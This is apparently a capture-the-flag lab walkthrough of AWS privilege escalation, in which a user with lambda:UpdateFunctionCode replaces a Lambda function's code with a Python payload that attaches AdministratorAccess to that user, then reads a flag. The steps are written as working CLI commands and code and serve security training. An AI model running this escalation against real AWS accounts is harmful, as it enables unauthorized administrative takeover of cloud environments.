# Guided Walkthrough: Privilege Escalation via lambda:UpdateFunctionCode

This scenario demonstrates a critical but often overlooked privilege escalation vector where an attacker with `lambda:UpdateFunctionCode` permission can compromise existing Lambda functions to execute arbitrary code under the function's privileged execution role. Unlike scenarios that require creating new infrastructure, this attack exploits pre-existing production workloads.

The vulnerability lies in treating code deployment permissions as less sensitive than IAM policy modifications. In reality, the ability to modify code that executes with elevated privileges is functionally equivalent to having those privileges yourself. If a Lambda function runs with an administrative role, anyone who can update its code can execute arbitrary operations with administrative access.

This scenario is particularly dangerous in real-world environments where Lambda functions are common, often highly privileged, and code update permissions may be granted too broadly for deployment automation or developer access.

## The Challenge

You start as `pl-prod-lambda-003-to-admin-starting-user`, an IAM user whose credentials you have obtained. This user has been granted `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on a specific Lambda function — the kind of permissions that might be handed out to a developer or a CI/CD service account.

Your goal is to reach `pl-prod-lambda-003-to-admin-target-role`, the Lambda function's execution role, which carries `AdministratorAccess`. You have no direct IAM escalation permissions — no `iam:AttachUserPolicy`, no `iam:PutRolePolicy`. But you don't need them directly, because the Lambda function's execution role already has them, and you control what code it runs.

## Reconnaissance

First, confirm who you are and that your starting permissions are what you expect:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"

aws sts get-caller-identity
```

You should see the ARN for `pl-prod-lambda-003-to-admin-starting-user`. Now verify you cannot perform admin actions yet:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

Good. Now discover the target Lambda function. If you have `lambda:ListFunctions`, you can enumerate:

```bash
aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table
```

Once you identify `pl-prod-lambda-003-to-admin-target-lambda`, pull its details to get the handler name and confirm the execution role:

```bash
aws lambda get-function --function-name pl-prod-lambda-003-to-admin-target-lambda
```

Note the `Configuration.Handler` field — it will be something like `lambda_function.lambda_handler`. The filename of your malicious code **must match the module portion of the handler** (i.e., `lambda_function.py` for the handler `lambda_function.lambda_handler`). Getting this wrong means your code never executes.

Also note the `Configuration.Role` ARN — this is `pl-prod-lambda-003-to-admin-target-role` with `AdministratorAccess`. That is what will be running your code.

## Exploitation

You now have everything you need. The plan: write a Python function that calls `iam:AttachUserPolicy` to grant your starting user `AdministratorAccess`, package it, and deploy it to the Lambda function using `lambda:UpdateFunctionCode`. Then invoke it.

### Step 1: Write the malicious payload

The file **must** be named `lambda_function.py` to match the handler:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    target_user = 'pl-prod-lambda-003-to-admin-starting-user'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    iam.attach_user_policy(
        UserName=target_user,
        PolicyArn=policy_arn
    )

    return {
        'statusCode': 200,
        'body': json.dumps({'success': True, 'message': f'Attached AdministratorAccess to {target_user}'})
    }
EOF
```

### Step 2: Package it

```bash
cd /tmp && zip lambda_function.zip lambda_function.py
```

### Step 3: Deploy the malicious code

```bash
aws lambda update-function-code \
  --function-name pl-prod-lambda-003-to-admin-target-lambda \
  --zip-file fileb:///tmp/lambda_function.zip
```

Wait a moment for Lambda to finish processing the update (about 15 seconds). You can poll `get-function` and check `LastUpdateStatus` until it shows `Successful`.

### Step 4: Invoke the function

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-003-to-admin-target-lambda \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json
```

The function executes under `pl-prod-lambda-003-to-admin-target-role` (which has `AdministratorAccess`) and calls `iam:AttachUserPolicy` on your starting user. The response should confirm success.

## Verification

Wait ~15 seconds for IAM policy propagation, then verify:

```bash
aws iam list-attached-user-policies --user-name pl-prod-lambda-003-to-admin-starting-user
```

You should see `AdministratorAccess` in the list. Confirm end-to-end:

```bash
aws iam list-users --max-items 3
# Now succeeds — you have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/lambda-003-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the implicit equivalence between "can deploy code" and "has the permissions that code runs with." The Lambda function's execution role had `AdministratorAccess`. Your starting user had `lambda:UpdateFunctionCode` and `lambda:InvokeFunction`. By replacing the function's benign code with a payload that grants your own user `AdministratorAccess`, you effectively laundered the execution role's privileges into your IAM user — without ever touching an IAM policy directly.

This is why `lambda:UpdateFunctionCode` on a function with an elevated execution role must be treated as an escalation-equivalent permission. In real environments this shows up as developer accounts that can deploy to Lambda for legitimate CI/CD purposes, or overly broad deployment roles that cover all functions rather than being scoped to specific, low-privilege ones.
